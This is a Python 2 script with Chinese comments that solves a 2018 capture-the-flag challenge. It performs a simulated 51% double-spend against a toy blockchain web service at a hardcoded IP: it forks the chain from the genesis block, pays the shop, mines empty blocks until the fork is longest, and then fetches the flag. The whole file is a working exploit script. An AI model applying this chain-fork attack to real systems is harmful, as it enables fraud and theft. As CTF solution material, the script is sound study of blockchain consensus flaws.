# # -*- encoding: utf-8 -*-
#脚本参考："https://skysec.top/2018/04/22/DDCTF-bitcoin-51per-Attack/"

import rsa, uuid, json, copy,requests,re,hashlib

# 获取初始session
url = "http://116.85.48.107:5000/b942f830cf97e/"
r = requests.get(url=url)
session = r.headers['Set-Cookie'].split(";")[0][8:]
Cookie = {
    "session":session
}
r = requests.get(url=url,cookies=Cookie)

# 获取需要的信息
genesis_hash_re = r'hash of genesis block: (.*?)<br /><br />'
genesis_hash = re.findall(genesis_hash_re, r.content)[0]

shop_address_re = r", the shop's addr: (.*?)<br /><br />"
shop_address = re.findall(shop_address_re, r.content)[0]

input_re = r'''\[\{"input": \["(.*?)"\],'''
input = re.findall(input_re, r.content)[0]

signature_re = r'''"\], "signature": \["(.*?)"\]'''
signature = re.findall(signature_re, r.content)[0]

txout_id = str(uuid.uuid4())

#工作量证明
def pow(b, difficulty, msg=""):
    nonce = 0
    while nonce<(2**32):
        b['nonce'] = msg+str(nonce)
        b['hash'] = hash_block(b)
        block_hash = int(b['hash'], 16)
        if block_hash < difficulty:
            return b
        nonce+=1
def myprint(b):
    return json.dumps(b)

DIFFICULTY = int('00000' + 'f' * 59, 16)

def hash(x):
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()

def hash_reducer(x, y):
    return hash(hash(x) + hash(y))

EMPTY_HASH = '0' * 64

def hash_utxo(utxo):
    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])

def hash_tx(tx):
    return reduce(hash_reducer, [
        reduce(hash_reducer, tx['input'], EMPTY_HASH),
        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
    ])

def hash_block(block):
    return reduce(hash_reducer, [block['prev'], block['nonce'],
                                 reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])

def empty_block(msg, prevHash):
    b={}
    b["prev"] = prevHash
    b["transactions"] = []
    b = pow(b, DIFFICULTY, msg)
    return b

#从创世块开始分叉，给商店转1000000
block1 = {}
block1["prev"] = genesis_hash
tx = {"input":[input],"output":[{"amount":1000000, 'id':txout_id,'addr':shop_address}],'signature':[signature]}
tx["output"][0]["hash"] = hash_utxo(tx["output"][0])
tx['hash'] = hash_tx(tx)
block1["transactions"] = [tx]
block1 = pow(block1, DIFFICULTY)
url_begin = "http://116.85.48.107:5000/b942f830cf97e/create_transaction"

def header_change(session):
    header = {
    "Host":"116.85.48.107:5000",
    "Upgrade-Insecure-Requests":"1",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language":"zh-CN,zh;q=0.8",
    "Cookie":"session="+session,
    "Connection":"close",
    "Content-Type":"application/json"
    }
    return header
s1 = requests.post(url=url_begin,data=myprint(block1),headers=header_change(session))
session1 = s1.headers['Set-Cookie'].split(";")[0][8:]
print s1.content

#构造空块增加分叉链长度，使分叉链最长，因为max的结果不唯一，少则一次多则两次
block2 = empty_block("myempty1", block1["hash"])
s2 = requests.post(url=url_begin,data=myprint(block2),headers=header_change(session1))
session2 = s2.headers['Set-Cookie'].split(";")[0][8:]
print s2.content

block3 = empty_block("myempty2", block2["hash"])
s3 = requests.post(url=url_begin,data=myprint(block3),headers=header_change(session2))
session3 = s3.headers['Set-Cookie'].split(";")[0][8:]
print s3.content

#余额更新成功,系统自动添加块，转走商店钱，钻石+１

#从自己的块，即系统转走钱之前的那个块再次分叉，添加空块
block4 = empty_block("myempty3", block3["hash"])
s4 = requests.post(url=url_begin,data=myprint(block4),headers=header_change(session3))
session4 = s4.headers['Set-Cookie'].split(";")[0][8:]
print s4.content

block5 = empty_block("myempty4", block4["hash"])
s5 = requests.post(url=url_begin,data=myprint(block5),headers=header_change(session4))
session5 = s5.headers['Set-Cookie'].split(";")[0][8:]
print s5.content

flag_url = "http://116.85.48.107:5000/b942f830cf97e/flag"
flag = requests.get(url=flag_url,headers=header_change(session5))
print flag.content
#新的分叉链最长，余额更新成功，钻石+１